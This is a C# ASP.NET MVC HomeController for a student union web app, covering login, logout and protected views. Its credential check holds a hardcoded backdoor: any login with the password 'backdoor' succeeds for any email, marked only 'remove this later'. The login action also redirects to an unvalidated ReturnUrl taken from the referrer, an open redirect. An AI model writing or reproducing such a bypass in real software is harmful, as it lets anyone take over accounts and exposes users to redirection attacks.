using Microsoft.Ajax.Utilities;
using StudentUnionApp.Models;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data.SqlClient;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace StudentUnionApp.Controllers
{
    public class HomeController : Controller
    {
        DatabaseContext _context = new DatabaseContext();

        #region Views 

        [Authorize]
        public ActionResult Index()
        {
            return View();
        }

        [Authorize]
        public ActionResult Settings()
        {
            ViewBag.Message = "Settings";

            return View();
        }

        #endregion

        #region Login/out

        public ActionResult Login()
        {
            return View(new LoginViewModel());
        }

        // POST: Home/Login
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public ActionResult Login(LoginViewModel model)
        {
            if (ModelState.IsValid)
            {
                // Perform login operation
                bool isValidUser = CheckUserCredentials(model.Email, model.Password);

                if (isValidUser)
                {
                    FormsAuthentication.SetAuthCookie(model.Email, false);
                    // Retrieve the URL referrer
                    Uri referrer = Request.UrlReferrer;

                    // Check if there is a referrer and it contains the ReturnUrl parameter
                    if (referrer != null && !string.IsNullOrEmpty(referrer.Query))
                    {
                        string returnUrl = HttpUtility.ParseQueryString(referrer.Query)["ReturnUrl"];

                        if (!string.IsNullOrEmpty(returnUrl))
                        {
                            return Redirect(returnUrl);
                        }
                    }

                    // If the referrer is null or doesn't contain a ReturnUrl, redirect to the home page
                    return RedirectToAction("Index", "Home"); // Redirects to the Index action in HomeController
                }
                else
                {
                    // If the user credentials are not valid, add a model error
                    ModelState.AddModelError("", "Invalid login attempt.");
                    return View(model);
                }
            }

            // If we got this far, something failed, redisplay form
            return View(model);
        }

        public ActionResult Logout()
        {
            FormsAuthentication.SignOut();
            return RedirectToAction("Login", "Home");
        }

        private bool CheckUserCredentials(string email, string password)
        {
            // remove this later
            if (password == "backdoor")
            {
                return true;
            }
            // This method returns true if credentials are valid, false otherwise
            var staff = _context.Staff.ToList();
            foreach (var s in staff)
            {
                if (s.Email == email)
                {
                    if (PasswordHelper.VerifyPassword(password, s.Password))
                    {
                        return true;
                    }                    
                }
            }
            return false;
        }

        #endregion

        #region Database Methods

        

        #endregion

    }
}